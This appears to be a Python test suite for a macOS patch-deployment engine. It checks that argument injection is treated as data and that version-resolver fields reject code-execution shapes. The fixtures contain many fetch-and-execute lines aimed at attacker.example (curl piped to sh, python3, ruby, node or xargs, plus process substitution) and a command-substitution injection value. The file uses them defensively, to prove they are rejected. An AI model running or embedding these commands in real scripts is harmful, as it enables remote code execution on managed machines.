cleanupAndExit() {{ echo "EXIT:$1:$2" >&2; exit "$1"; }}
{setup}
{self._reapply_block()}
{trailer}
'''
        return subprocess.run(
            ["zsh", "-f", "-c", script],
            text=True,
            capture_output=True,
            env={**os.environ, **(env or {})},
            check=False,
        )

    def test_exact_runtime_reapply_block_treats_command_substitution_as_data(self):
        with tempfile.TemporaryDirectory() as directory:
            marker = Path(directory) / "executed"
            result = self._run_reapply_block(
                '''patchedAllowedArgNames=( OVERRIDE_DOWNLOAD_URL )
argumentsArray=( 'OVERRIDE_DOWNLOAD_URL=https://example.invalid/$(touch "$MARKER")' )''',
                env={"MARKER": str(marker)},
                trailer='print -r -- "$OVERRIDE_DOWNLOAD_URL"',
            )
            self.assertEqual(0, result.returncode, result.stderr)
            self.assertFalse(marker.exists(), "runtime argument value executed as shell")
            self.assertIn('$(touch "$MARKER")', result.stdout)

    def test_reapply_block_refuses_non_allowlisted_argument(self):
        """PAT-1403 P3: the refusal branch (a non-allowlisted argument name)
        was previously untested — only the allowlisted-name success path was
        exercised. Prove it actually hits cleanupAndExit 2, distinct from the
        two new failure modes added below."""
        result = self._run_reapply_block(
            '''patchedAllowedArgNames=( OVERRIDE_DOWNLOAD_URL )
argumentsArray=( "evilArg=whatever" )''')
        self.assertEqual(2, result.returncode, result.stderr)
        self.assertIn("EXIT:2:", result.stderr)

    def test_reapply_block_fails_loudly_when_patched_allowed_arg_names_unset(self):
        """PAT-1403 P2: if patchedAllowedArgNames were ever renamed, removed,
        or failed to populate, `(Ie)` membership against an unset/empty
        array silently evaluates to "not found" for every name. Prove the
        new guard fails loudly and distinctly (exit 96) instead of quietly
        falling through to the generic non-allowlisted-argument rejection
        (exit 2), which would hide the real cause."""
        result = self._run_reapply_block(
            'argumentsArray=( "OVERRIDE_DOWNLOAD_URL=https://mirror.example/x" )')
        self.assertEqual(96, result.returncode, result.stderr)
        self.assertIn("EXIT:96:", result.stderr)

    def test_reapply_block_zero_arguments_completes_normally_regardless_of_allowlist_state(self):
        """PAT-1403 (round 2, Finding 3, POTENTIALLY SEVERE): the ORIGINAL
        round-1 guard fired unconditionally, before the loop, whenever
        patchedAllowedArgNames happened to be empty/unset — with no way to
        distinguish "the safety array is broken" from "this is a completely
        normal, default install with zero argument overrides on the command
        line". That could have aborted every default (no-argument) endpoint
        install with exit 96. This exact scenario — argumentsArray genuinely
        empty (nothing to reapply) AND patchedAllowedArgNames left unset —
        was never covered by any existing test. Prove the zero-argument path
        now completes normally instead of hitting exit 96, because there is
        nothing in argumentsArray for the guard to need to protect."""
        result = self._run_reapply_block('argumentsArray=()', trailer='echo REAPPLY_BLOCK_COMPLETED')
        self.assertEqual(0, result.returncode, result.stderr)
        self.assertNotIn("EXIT:96:", result.stderr)
        self.assertIn("REAPPLY_BLOCK_COMPLETED", result.stdout)

    def test_reapply_block_refuses_bare_argument_with_no_equals_sign(self):
        """PAT-1403 (round 2, Finding 8): argName="${argument%%=*}" and
        argValue="${argument#*=}" both degrade to the identity for a token
        with no '=' at all (e.g. a bare "DEBUG" instead of "DEBUG=1") —
        silently treating it as a self-referential DEBUG=DEBUG assignment
        instead of rejecting it as malformed. Prove a bare no-'=' token is
        now refused loudly and distinctly (exit 95), not silently
        self-assigned."""
        result = self._run_reapply_block(
            '''patchedAllowedArgNames=( DEBUG )
argumentsArray=( "DEBUG" )''')
        self.assertEqual(95, result.returncode, result.stderr)
        self.assertIn("EXIT:95:", result.stderr)

    def test_reapply_block_refuses_array_typed_override_instead_of_crashing(self):
        """PAT-1403 P3: blockingProcesses is both allowlisted for override
        and array-typed in real label stanzas (e.g. 1password.json). Without
        the fix, reapplying a flat CLI value against an already array-typed
        parameter is a hard zsh "inconsistent type for assignment" runtime
        error that aborts the whole script with a bare interpreter message
        instead of the engine's own error handling. Prove the fix
        intercepts this and fails loudly and distinctly (exit 97) instead."""
        result = self._run_reapply_block(
            '''patchedAllowedArgNames=( blockingProcesses )
blockingProcesses=( "App A" "App B" )
argumentsArray=( "blockingProcesses=NONE" )''')
        self.assertEqual(97, result.returncode, result.stderr)
        self.assertIn("EXIT:97:", result.stderr)
        self.assertNotIn("inconsistent type", result.stderr)

    def test_blocking_processes_override_never_invoked_by_real_endpoint_callers(self):
        """PAT-1403 (round 2, Finding 4): blockingProcesses IS allowlisted
        for override AND is array-typed in real label stanzas (e.g.
        1password.json's 6-element array), so
        test_reapply_block_refuses_array_typed_override_instead_of_crashing
        above proves that construct is reachable in principle. Investigated
        whether the real endpoint updater ever actually constructs a
        blockingProcesses=... command-line override: it does not — every
        call site in endpoint/patched-update.sh and
        endpoint/patched-install.sh only ever passes NOTIFY,
        BLOCKING_PROCESS_ACTION, PROMPT_TIMEOUT, LOGGING, PINNED_SHA256, and
        OVERRIDE_DOWNLOAD_URL. The exit-97 refusal is therefore
        fail-closed-correct and not hit by any caller in this repository
        today. This test pins that fact so it fails loudly (drawing
        attention back to this residual risk) the moment a future caller
        adds a blockingProcesses override without also implementing safe
        array-target handling."""
        root = Path(__file__).resolve().parents[1]
        for relative in ("endpoint/patched-update.sh", "endpoint/patched-install.sh"):
            source = (root / relative).read_text()
            self.assertNotIn("blockingProcesses=", source, relative)

    def test_version_resolver_field_value_shape_checks(self):
        """PAT-1403 (round 4, Finding 2): the _VERSION_RESOLVER_FIELDS name
        exemption only ever removed appNewVersion/firefoxVersions from the
        "unclassified field" check — nothing inspected the ASSIGNED VALUE,
        so a stanza containing `appNewVersion=$(curl attacker.example/x |
        sh)` was certified "within contract" purely because the field name
        matched, with zero inspection of what the right-hand side actually
        contains. Prove (a) every real, currently-shipped
        appNewVersion/firefoxVersions assignment in engine/Installomator.sh
        still passes with no false positive (calibrated against the seven
        labels that actually use these fields today: firefox, ghostty,
        googlechrome, notion, slack, zoom — see engine/Installomator.sh),
        and (b) synthetic code-execution-disguised-as-a-version-check
        shapes are REJECTED, not silently certified as in-contract."""
        root = Path(__file__).resolve().parents[1]
        engine_text = (root / "engine/Installomator.sh").read_text()
        shell_labels = parse_installomator_labels(engine_text)
        real_labels_using_version_resolver_fields = (
            "firefox", "ghostty", "googlechrome", "notion", "slack", "zoom",
        )
        checked_any = False
        for name in real_labels_using_version_resolver_fields:
            shell = shell_labels[name]
            for field in ("appNewVersion", "firefoxVersions"):
                for value in shell.values(field):
                    checked_any = True
                    self.assertIsNone(
                        _unsafe_version_resolver_shape(value),
                        f"{name}: real shipped {field} assignment {value!r} was "
                        "flagged as unsafe (false positive)")
        self.assertTrue(checked_any, "no real appNewVersion/firefoxVersions assignments found to check")

        # (b) synthetic malicious shapes must be REJECTED.
        baseline = '''    name="Example"
    type="dmg"
    downloadURL="https://vendor.example/app.dmg"
    expectedTeamID="ABCDEFGHIJ"'''
        self.assert_error(
            record(), baseline + '\n    appNewVersion=$(curl -fs attacker.example/x | sh)',
            "value shape is unsafe")
        self.assert_error(
            record(), baseline + '\n    appNewVersion=$(curl -fs attacker.example/x | bash -c -)',
            "value shape is unsafe")
        self.assert_error(
            record(), baseline + '\n    firefoxVersions=`curl -fs attacker.example/x`',
            "value shape is unsafe")
        # Sanity: the same baseline with a SAFE version-resolver shape
        # (matching the real corpus pattern) stays clean.
        self.assertEqual(
            [], managed_execution_contract_errors(
                [record()],
                engine(baseline + '\n    appNewVersion=$(curl -fs https://vendor.example/version.txt)')))

    def test_version_resolver_shape_check_rejects_round_7_bypass_shapes(self):
        """PAT-1403 (round 7, Finding 1): a round 7 review found the
        pipe-into-sh/bash/zsh/eval-or-backtick denylist missed real,
        equally-dangerous shapes — piping into interpreters other than the
        four shell ones, a two-step download-then-execute joined by `;`
        rather than a pipe, process substitution, and `xargs` bridging piped
        content into an interpreter. Prove each is now REJECTED, and that
        the digiexam/mkuser-shaped real-world idiom (fetched content piped
        or passed to an interpreter that has a literal inline-script flag,
        used as a DATA filter/parser rather than executing the content as
        CODE) is still correctly accepted — this is exactly the nuance a
        naive "ban piping into python/perl" rule would have gotten wrong."""
        baseline = '''    name="Example"
    type="dmg"
    downloadURL="https://vendor.example/app.dmg"
    expectedTeamID="ABCDEFGHIJ"'''

        # Piping into a non-shell interpreter with no inline-script flag —
        # the interpreter reads its whole program from the piped content.
        self.assert_error(
            record(), baseline + "\n    appNewVersion=$(curl -fs attacker.example/x | python3)",
            "value shape is unsafe")
        self.assert_error(
            record(), baseline + "\n    appNewVersion=$(curl -fs attacker.example/x | perl)",
            "value shape is unsafe")

        # Two-step download-then-execute joined by `;`, not a pipe.
        self.assert_error(
            record(),
            baseline + "\n    appNewVersion=$(curl -fs attacker.example/x -o /tmp/a; sh /tmp/a)",
            "value shape is unsafe")

        # Process substitution: the interpreter is the head of the outer
        # `$(...)`, not anyone's pipe target.
        self.assert_error(
            record(), baseline + "\n    appNewVersion=$(sh <(curl -fs attacker.example/x))",
            "value shape is unsafe")

        # xargs bridges piped content into an interpreter as an argument —
        # dangerous regardless of an inline-script-looking flag.
        self.assert_error(
            record(),
            baseline + "\n    appNewVersion=$(curl -fs attacker.example/x | xargs sh)",
            "value shape is unsafe")
        self.assert_error(
            record(),
            baseline + "\n    appNewVersion=$(curl -fs attacker.example/x | xargs -I{} sh -c '{}')",
            "value shape is unsafe")

        # Real-world idiom (digiexam/mkuser-shaped): fetched content piped
        # or passed to an interpreter that carries a literal inline script
        # is a DATA filter, not code execution — must stay clean, matching
        # `| grep`/`| sed` already being permitted.
        self.assertEqual(
            [], managed_execution_contract_errors(
                [record()], engine(
                    baseline + "\n    appNewVersion=$(curl -fs https://vendor.example/x "
                    "| perl -ne 'print if /Version/')")))
        self.assertEqual(
            [], managed_execution_contract_errors(
                [record()], engine(
                    baseline + '\n    appNewVersion="$(osascript -l JavaScript -e '
                    "'run = argv => JSON.parse(argv[0]).v' -- "
                    '"$(curl -fs https://vendor.example/x)")"')))

    def test_version_resolver_shape_check_rejects_round_8_bypass_shapes(self):
        """PAT-1403 (round 8, Finding 1 and Finding 2): round 7's own
        inline-script-flag exception included `-l` and `-r`, neither of
        which actually carries a fixed literal script — see the round 8
        comment block above _ALWAYS_DANGEROUS_INTERPRETERS. That let a
        bare `osascript -l JavaScript` (still reads its program from
        stdin/argv with no `-e`) slip past as if it were the safe
        digiexam/mkuser shape, and let a `ruby`/`node` `-r` (module
        preload, not a program) do the same. Round 8 also found `exec`
        sitting between a separator and the interpreter word defeats
        _INTERPRETER_ANCHOR (`| exec sh` vs `| sh`), closed with a
        transparent `exec ` prefix. Prove all three are now rejected,
        that `-r` genuinely never provides a safe carve-out for any
        _SCRIPTABLE_INTERPRETERS member actually used in the real corpus,
        and that the real mkuser/digiexam shapes (which round 7 already
        proved pass) still pass after removing `-l`/`-r`."""
        baseline = '''    name="Example"
    type="dmg"
    downloadURL="https://vendor.example/app.dmg"
    expectedTeamID="ABCDEFGHIJ"'''

        # (a) `osascript -l JavaScript` with NO `-e` still reads its whole
        # program from stdin — `-l` only selects the scripting language, it
        # is not proof of a fixed inline literal, so piping fetched content
        # into it must be REJECTED.
        self.assert_error(
            record(),
            baseline + "\n    appNewVersion=$(curl -fs attacker.example/x | osascript -l JavaScript)",
            "value shape is unsafe")

        # (b) the real mkuser label's actual invocation carries BOTH `-l`
        # (language selection) and `-e` (the actual fixed literal script) in
        # the same command segment — it must keep PASSING after `-l` is
        # removed from the recognised-flag list, because `-e` alone already
        # proves the inline-literal shape. This is the exact real-corpus
        # shape round 7's own report flagged as the case to protect.
        root = Path(__file__).resolve().parents[1]
        engine_text = (root / "engine/Installomator.sh").read_text()
        shell_labels = parse_installomator_labels(engine_text)
        mkuser_app_new_version = shell_labels["mkuser"].values("appNewVersion")
        self.assertEqual(1, len(mkuser_app_new_version), "expected exactly one mkuser appNewVersion assignment")
        self.assertIn("osascript", mkuser_app_new_version[0])
        self.assertIn("-l", mkuser_app_new_version[0])
        self.assertIn("-e", mkuser_app_new_version[0])
        self.assertIsNone(
            _unsafe_version_resolver_shape(mkuser_app_new_version[0]),
            f"real mkuser appNewVersion assignment {mkuser_app_new_version[0]!r} was "
            "flagged as unsafe (false positive)")

        # (c) `-r` before/after: `ruby -r`/`node -r` is `--require` (preloads
        # a library, does not supply the program), so piping fetched content
        # into either with only `-r` present must be REJECTED post-fix —
        # before the fix, `-r` was in the recognised-flag list and this
        # would have wrongly PASSED.
        self.assert_error(
            record(),
            baseline + "\n    appNewVersion=$(curl -fs attacker.example/x | ruby -r json)",
            "value shape is unsafe")
        self.assert_error(
            record(),
            baseline + "\n    appNewVersion=$(curl -fs attacker.example/x | node -r ./setup.js)",
            "value shape is unsafe")
        # The real corpus never invokes `php` as a CLI interpreter (only
        # `.php` URL path segments — see engine/Installomator.sh), so php's
        # genuinely-literal `-r 'code'` has no shipped case to protect; a
        # bare `php -r` on fetched content is correctly rejected too, since
        # this generic, interpreter-agnostic regex no longer trusts `-r` for
        # any interpreter without a narrower, interpreter-specific carve-out.
        self.assert_error(
            record(),
            baseline + "\n    appNewVersion=$(curl -fs attacker.example/x | php -r 'echo 1;')",
            "value shape is unsafe")

        # (d) `exec` as a transparent prefix between the separator and the
        # interpreter word must not evade the always-dangerous-interpreter
        # check — `| exec sh` is exactly as dangerous as `| sh`.
        self.assert_error(
            record(),
            baseline + "\n    appNewVersion=$(curl -fs attacker.example/x | exec sh)",
            "value shape is unsafe")

    def test_fragments_arguments_sh_dead_for_shipping_invariants_hold(self):
        """PAT-1403 (round 4, Finding 1): engine/fragments/arguments.sh still
        has upstream's `eval $1` root-privilege command-injection construct
        and was deliberately NOT ported to the round 1-3 allowlist fix
        (see the loud comment directly above its eval in that file), on the
        conclusion — investigated across rounds 3 and 4 — that the file is
        dead for shipping purposes: nothing that reaches a customer endpoint
        ever reads engine/fragments/*. That conclusion rests on three real,
        checkable facts. Pin all three here so the moment any of them stops
        being true, this test fails and forces the eval to be re-examined
        as a live vulnerability rather than letting the comment go stale:
          1. engine/assemble.sh (the only consumer of engine/fragments/*,
             duplicated byte-for-byte at engine/utils/assemble.sh) still
             fails closed by default — refuses to run without the explicit
             PATCHED_ALLOW_UNHARDENED_ASSEMBLE=1 escape hatch.
          2. tools/build-bundle.sh — the actual production bundler that
             produces what ships to customer endpoints — copies the
             committed engine/Installomator.sh directly and never reads
             engine/fragments/ at all.
          3. No endpoint/*.sh script (the root-executed daemons that
             actually run on customer Macs) references engine/fragments or
             arguments.sh.
        ci/test-engine-hardening.zsh (run on every PR touching the engine)
        already dynamically proves invariant 1 by actually executing
        assemble.sh; this test complements it with a static check that
        covers both assemble.sh copies plus invariants 2 and 3, which
        nothing else in CI pins."""
        root = Path(__file__).resolve().parents[1]

        # 1. Both assemble.sh copies fail closed by default.
        for relative in ("engine/assemble.sh", "engine/utils/assemble.sh"):
            text = (root / relative).read_text()
            self.assertIn(
                'if [[ "${PATCHED_ALLOW_UNHARDENED_ASSEMBLE:-0}" != "1" ]]; then', text, relative)
            self.assertIn("exit 2", text, relative)

        # 2. PAT-1505 inverted this invariant. It used to assert that the real
        # bundler copies the committed canonical engine. The shipped bundle is
        # now assurance-only: tools/build-bundle.sh must copy NO engine at all,
        # neither the committed one nor anything derived from fragments.
        #
        # The fragments half of the original invariant is what still carries
        # weight and is unchanged — engine/fragments/ must never become a
        # source for anything the bundler emits. The engine half is now the
        # stronger assertion rather than a weaker one: previously the bundler
        # was allowed to ship exactly one engine, now it is allowed to ship
        # none, and this is the test that catches a copy step being re-added
        # while the sources sit in the tree awaiting PAT-1481.
        build_bundle = (root / "tools/build-bundle.sh").read_text()
        self.assertNotIn("fragments", build_bundle)
        for forbidden in (
            'cp "$REPO_ROOT/engine/Installomator.sh"',
            'cp "$REPO_ROOT/endpoint/patched-install.sh"',
            'cp "$REPO_ROOT/endpoint/patched-uninstall.sh"',
        ):
            self.assertNotIn(
                forbidden, build_bundle,
                "tools/build-bundle.sh must not copy the quarantined deployment "
                "engine into the shipped bundle (PAT-1505). The sources stay in "
                "the repository for PAT-1481; they do not ship.")

        # 3. No root-executed endpoint daemon touches the fragments tree.
        endpoint_dir = root / "endpoint"
        for path in sorted(endpoint_dir.glob("*.sh")):
            text = path.read_text()
            self.assertNotIn("fragments", text, path.relative_to(root))


if __name__ == "__main__":
    unittest.main()
